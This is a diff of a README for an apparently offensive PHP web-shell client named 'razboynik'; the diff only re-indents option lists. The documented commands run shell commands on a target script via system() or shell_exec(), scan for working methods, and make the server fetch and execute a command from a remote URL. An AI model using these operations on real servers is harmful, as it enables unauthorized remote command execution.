@@ -80,13 +80,13 @@ You will find the API of all the business logic in the appropriate repository `r
 Run a reverse shell with specified configuration
 
 OPTIONS: 
-    - `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
-    - `-m, --method`: (string) Method to use. Ex: `-m POST` (default: "GET")
-    - `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
-    - `-s, --shellmethod`: (int) Shellmethod to use. Ex: `-s 0` (default: 0) [0 => system(), 1 => shell_exec()]
-    - `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: "FromRussiaWithLove<3")
-    - `-r, --raw`: (bool) If set, send the request without base64 encoding
-    - `-c, --crypt`: (Not available)
+- `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
+- `-m, --method`: (string) Method to use. Ex: `-m POST` (default: "GET")
+- `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
+- `-s, --shellmethod`: (int) Shellmethod to use. Ex: `-s 0` (default: 0) [0 => system(), 1 => shell_exec()]
+- `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: `FromRussiaWithLove<3`)
+- `-r, --raw`: (bool) If set, send the request without base64 encoding
+- `-c, --crypt`: (Not available)
 
 ###generate
 (Not available yet)
@@ -95,17 +95,17 @@ OPTIONS:
 Scan a website to identify what shell method and method works on it.
 
 OPTIONS:
-    - `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
-    - `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
-    - `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: "FromRussiaWithLove<3")
+- `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
+- `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
+- `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: `FromRussiaWithLove<3`)
 
 ###invisible
 Execute a raw command available at an url (referer). Ex: http://website/cmd.txt point to `'echo 1;'` in body, then I can do : 
-    - `-u ... -r http://website/cmd.txt`
+- `-u ... -r http://website/cmd.txt`
 
 OPTIONS:
-    - `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
-    - `-r, --referer`: (string) Url that the server will call to get the cmd to execute. Ex: `-r http://website.com/cmd-i-want-to-execute.txt`
+- `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
+- `-r, --referer`: (string) Url that the server will call to get the cmd to execute. Ex: `-r http://website.com/cmd-i-want-to-execute.txt`
 
 ###encode / decode
 Encode or decode string.
